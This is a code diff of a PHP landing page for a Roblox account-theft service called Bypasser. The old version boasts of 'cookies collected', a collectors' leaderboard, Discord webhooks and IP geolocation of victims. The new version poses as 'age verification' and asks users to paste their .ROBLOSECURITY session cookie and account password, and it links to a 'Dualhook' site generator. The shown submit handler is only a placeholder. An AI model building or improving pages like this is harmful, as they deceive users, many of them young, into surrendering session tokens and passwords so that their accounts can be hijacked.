@@ -1,246 +1,465 @@
 <?php
-require_once __DIR__ . '/config.php';
-require_once __DIR__ . '/functions.php';
+require_once 'config.php';
+require_once 'functions.php';
 
-$stats = getGlobalStats();
-$leaderboard = getLeaderboard(5);
+$globalStats = getGlobalStats();
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bypasserv3 - Roblox Cookie Refresher</title>
+    <title>Bypasser - Fast & Secure Age Verification</title>
     <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
     <style>
-        :root {
-            --primary: #3b82f6;
-            --primary-dark: #2563eb;
-            --dark: #02040a;
-            --darker: #0a0e27;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
         body {
-            font-family: 'Outfit', sans-serif;
-            background: linear-gradient(135deg, var(--dark) 0%, var(--darker) 50%, var(--dark) 100%);
-            background-size: 400% 400%;
-            animation: gradientShift 15s ease infinite;
-            color: #f8fafc;
-        }
-
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        .glass-effect {
-            backdrop-filter: blur(10px) saturate(180%);
-            background-color: rgba(17, 25, 40, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.125);
-        }
-
-        .animated-gradient-text {
-            background: linear-gradient(90deg, #3b82f6 0%, #2563eb 25%, #1d4ed8 50%, #3b82f6 75%, #2563eb 100%);
-            background-size: 200% auto;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: gradientFlow 3s linear infinite;
-        }
-
-        @keyframes gradientFlow {
-            0% { background-position: 0% center; }
-            100% { background-position: 200% center; }
-        }
-
-        .hover-lift {
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-        }
-
-        .hover-lift:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
-        }
-
-        .stat-counter {
-            font-size: 3rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .feature-icon {
-            width: 60px;
-            height: 60px;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
+            color: #ffffff;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            border-radius: 16px;
-            font-size: 28px;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .left-section {
+            background: #141414;
+            border: 1px solid #1f1f1f;
+            border-radius: 24px;
+            padding: 48px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 48px;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: #ffffff;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .logo-text {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+        }
+
+        h1 {
+            font-size: 42px;
+            font-weight: 700;
+            line-height: 1.2;
             margin-bottom: 16px;
+            letter-spacing: -0.03em;
+        }
+
+        .subtitle {
+            color: #808080;
+            font-size: 16px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .tab-buttons {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 32px;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 12px 24px;
+            background: transparent;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            color: #808080;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .tab-button.active {
+            background: #ffffff;
+            color: #0a0a0a;
+            border-color: #ffffff;
+        }
+
+        .tab-button:not(.active):hover {
+            border-color: #404040;
+            color: #ffffff;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            color: #b0b0b0;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 20px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 15px;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .form-input::placeholder {
+            color: #505050;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #404040;
+            background: #0f0f0f;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 16px 32px;
+            background: #ffffff;
+            color: #0a0a0a;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .submit-button:hover {
+            background: #f0f0f0;
+            transform: translateY(-1px);
+        }
+
+        .submit-button:active {
+            transform: translateY(0);
+        }
+
+        .dualhook-button {
+            width: 100%;
+            padding: 16px 32px;
+            background: transparent;
+            color: #ffffff;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 12px;
+        }
+
+        .dualhook-button:hover {
+            border-color: #404040;
+            background: #141414;
+        }
+
+        .right-section {
+            padding-left: 40px;
+        }
+
+        .right-section .logo {
+            margin-bottom: 32px;
+        }
+
+        .feature-title {
+            font-size: 32px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 16px;
+            letter-spacing: -0.02em;
+        }
+
+        .feature-description {
+            color: #808080;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 968px) {
+            .container {
+                grid-template-columns: 1fr;
+                gap: 40px;
+            }
+
+            .right-section {
+                padding-left: 0;
+                text-align: center;
+            }
+
+            h1 {
+                font-size: 32px;
+            }
+
+            .feature-title {
+                font-size: 24px;
+            }
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(10, 10, 10, 0.3);
+            border-radius: 50%;
+            border-top-color: #0a0a0a;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .stats-footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #1f1f1f;
+            display: flex;
+            gap: 32px;
+            justify-content: center;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 4px;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #606060;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
         }
     </style>
 </head>
-<body class="min-h-screen overflow-x-hidden">
-    <!-- Hero Section -->
-    <div class="container max-w-6xl mx-auto px-4 py-16">
-        <div class="text-center mb-16">
-            <div class="relative inline-block mb-8">
-                <div class="absolute inset-0 bg-blue-600/20 blur-3xl rounded-full"></div>
-                <div class="relative w-24 h-24 bg-white/5 border border-white/10 rounded-3xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect mx-auto">
-                    <span class="text-5xl">🍪</span>
-                </div>
+<body>
+    <div class="container">
+        <!-- Left Section - Form -->
+        <div class="left-section">
+            <div class="logo">
+                <div class="logo-icon">🛡️</div>
+                <div class="logo-text">BYPASSER</div>
             </div>
-            
-            <h1 class="text-6xl md:text-7xl font-display font-bold tracking-tight mb-6 animated-gradient-text">
-                Bypasserv3
-            </h1>
-            
-            <p class="text-white/60 text-xl mb-12 max-w-2xl mx-auto">
-                Advanced Roblox Cookie Refresher & Bypass System
-            </p>
-            
-            <div class="flex gap-4 justify-center flex-wrap">
-                <a href="/generator/" class="px-8 py-4 bg-gradient-to-r from-blue-600 to-blue-500 text-white rounded-2xl font-bold text-lg hover:from-blue-700 hover:to-blue-600 transition-all hover:scale-105 inline-flex items-center gap-3 shadow-lg shadow-blue-500/50">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
-                    Create Instance
-                </a>
-                
-                <a href="/dashboard/sign-in.php" class="px-8 py-4 bg-white/10 text-white border border-white/20 rounded-2xl font-bold text-lg hover:bg-white/15 transition-all hover:scale-105 inline-flex items-center gap-3 glass-effect">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
-                    Dashboard
-                </a>
-            </div>
-        </div>
 
-        <!-- Stats Section -->
-        <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-16">
-            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
-                <div class="text-white/60 text-sm font-medium mb-2">Total Sites</div>
-                <div class="stat-counter"><?php echo number_format($stats['totalSites']); ?></div>
-            </div>
-            
-            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
-                <div class="text-white/60 text-sm font-medium mb-2">Total Instances</div>
-                <div class="stat-counter"><?php echo number_format($stats['totalInstances']); ?></div>
-            </div>
-            
-            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
-                <div class="text-white/60 text-sm font-medium mb-2">Cookies Collected</div>
-                <div class="stat-counter"><?php echo number_format($stats['totalCookies']); ?></div>
-            </div>
-            
-            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
-                <div class="text-white/60 text-sm font-medium mb-2">Total Visits</div>
-                <div class="stat-counter"><?php echo number_format($stats['totalVisits']); ?></div>
-            </div>
-        </div>
+            <h1>Bypass your account</h1>
+            <p class="subtitle">Use cookie or cookie with password to continue.</p>
 
-        <!-- Leaderboard -->
-        <?php if (!empty($leaderboard)): ?>
-        <div class="glass-effect rounded-2xl p-8 mb-16">
-            <h2 class="text-3xl font-bold mb-6 text-center">🏆 Top Collectors</h2>
-            <div class="space-y-4">
-                <?php foreach ($leaderboard as $index => $user): ?>
-                    <?php $rank = getRankInfo($user['totalCookies']); ?>
-                    <div class="bg-white/5 rounded-xl p-4 flex items-center gap-4 hover:bg-white/10 transition-colors">
-                        <div class="text-2xl font-bold text-white/40 w-8">#<?php echo $index + 1; ?></div>
-                        
-                        <img src="<?php echo htmlspecialchars($user['profilePicture']); ?>" alt="Avatar" class="w-12 h-12 rounded-full border-2 border-blue-500/50">
-                        
-                        <div class="flex-1">
-                            <div class="font-semibold text-white"><?php echo htmlspecialchars($user['username']); ?></div>
-                            <div class="text-sm text-white/60">
-                                <?php echo $rank['current']['icon']; ?> <?php echo $rank['current']['name']; ?>
-                            </div>
-                        </div>
-                        
-                        <div class="text-right">
-                            <div class="font-bold text-blue-400"><?php echo number_format($user['totalCookies']); ?> cookies</div>
-                            <div class="text-sm text-white/60"><?php echo number_format($user['totalVisits']); ?> visits</div>
-                        </div>
+            <!-- Tab Buttons -->
+            <div class="tab-buttons">
+                <button class="tab-button active" onclick="switchTab('cookie')">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"/>
+                        <path d="M12 6v6l4 2"/>
+                    </svg>
+                    Cookie Only
+                </button>
+                <button class="tab-button" onclick="switchTab('password')">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                    </svg>
+                    Password
+                </button>
+            </div>
+
+            <!-- Cookie Only Tab -->
+            <div id="cookie-tab" class="tab-content active">
+                <form id="cookie-form" onsubmit="handleBypass(event, 'cookie')">
+                    <div class="form-group">
+                        <label class="form-label">.ROBLOSECURITY Cookie</label>
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="cookie-input"
+                            placeholder="Paste your cookie here"
+                            required
+                        >
                     </div>
-                <?php endforeach; ?>
+
+                    <button type="submit" class="submit-button" id="cookie-submit">
+                        <span>Start Bypass</span>
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 12h14M12 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+
+                    <a href="/generator/" class="dualhook-button">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 5v14M5 12h14"/>
+                        </svg>
+                        Create Dualhook Site
+                    </a>
+                </form>
+            </div>
+
+            <!-- Password Tab -->
+            <div id="password-tab" class="tab-content">
+                <form id="password-form" onsubmit="handleBypass(event, 'password')">
+                    <div class="form-group">
+                        <label class="form-label">.ROBLOSECURITY Cookie</label>
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="password-cookie-input"
+                            placeholder="Paste your cookie here"
+                            required
+                        >
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Account Password</label>
+                        <input 
+                            type="password" 
+                            class="form-input" 
+                            id="password-input"
+                            placeholder="Enter your password"
+                            required
+                        >
+                    </div>
+
+                    <button type="submit" class="submit-button" id="password-submit">
+                        <span>Start Bypass</span>
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 12h14M12 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+
+                    <a href="/generator/" class="dualhook-button">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 5v14M5 12h14"/>
+                        </svg>
+                        Create Dualhook Site
+                    </a>
+                </form>
+            </div>
+
+            <!-- Stats Footer -->
+            <div class="stats-footer">
+                <div class="stat-item">
+                    <div class="stat-value"><?php echo number_format($globalStats['totalCookies']); ?></div>
+                    <div class="stat-label">Bypassed</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value"><?php echo number_format($globalStats['totalInstances']); ?></div>
+                    <div class="stat-label">Sites</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value"><?php echo number_format($globalStats['totalVisits']); ?></div>
+                    <div class="stat-label">Visits</div>
+                </div>
             </div>
         </div>
-        <?php endif; ?>
 
-        <!-- Features -->
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-16">
-            <div class="glass-effect rounded-2xl p-6 hover-lift text-center">
-                <div class="feature-icon mx-auto">🔒</div>
-                <h3 class="text-xl font-bold mb-2">Secure</h3>
-                <p class="text-white/60">Military-grade security with advanced malware protection and rate limiting</p>
+        <!-- Right Section - Info -->
+        <div class="right-section">
+            <div class="logo">
+                <div class="logo-icon">🛡️</div>
+                <div class="logo-text">BYPASSER</div>
             </div>
-            
-            <div class="glass-effect rounded-2xl p-6 hover-lift text-center">
-                <div class="feature-icon mx-auto">⚡</div>
-                <h3 class="text-xl font-bold mb-2">Fast</h3>
-                <p class="text-white/60">Lightning-fast cookie refresh with real-time stats and instant webhooks</p>
-            </div>
-            
-            <div class="glass-effect rounded-2xl p-6 hover-lift text-center">
-                <div class="feature-icon mx-auto">📊</div>
-                <h3 class="text-xl font-bold mb-2">Analytics</h3>
-                <p class="text-white/60">Comprehensive dashboard with detailed analytics and leaderboards</p>
-            </div>
-        </div>
 
-        <!-- Features List -->
-        <div class="glass-effect rounded-2xl p-8">
-            <h2 class="text-3xl font-bold mb-6 text-center">✨ Full Features</h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Account info fetching</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Robux balance display</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Premium status check</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Limited RAP calculation</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Group ownership detection</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>IP geolocation</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Game visit stats</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Rich Discord embeds</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Cookie refresh bypass</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-green-400 text-xl">✅</span>
-                    <span>Master admin logging</span>
-                </div>
-            </div>
+            <h2 class="feature-title">Fast and secure age verification</h2>
+            <p class="feature-description">
+                Bypass age restrictions quickly and securely. Our service handles everything for you.
+            </p>
         </div>
     </div>
 
-    <!-- Footer -->
-    <div class="text-center py-8 text-white/40">
-        <p>&copy; 2024 Bypasserv3. All rights reserved.</p>
-    </div>
+    <script>
+        function switchTab(tab) {
+            // Update tab buttons
+            document.querySelectorAll('.tab-button').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.closest('.tab-button').classList.add('active');
+
+            // Update tab content
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.getElementById(tab + '-tab').classList.add('active');
+        }
+
+        async function handleBypass(event, type) {
+            event.preventDefault();
+            
+            const submitBtn = event.target.querySelector('.submit-button');
+            const originalHTML = submitBtn.innerHTML;
+            
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<div class="spinner"></div>';
+
+            // Simulate bypass (replace with your actual API call)
+            setTimeout(() => {
+                alert('Bypass functionality coming soon! For now, use the Dualhook Generator.');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = originalHTML;
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
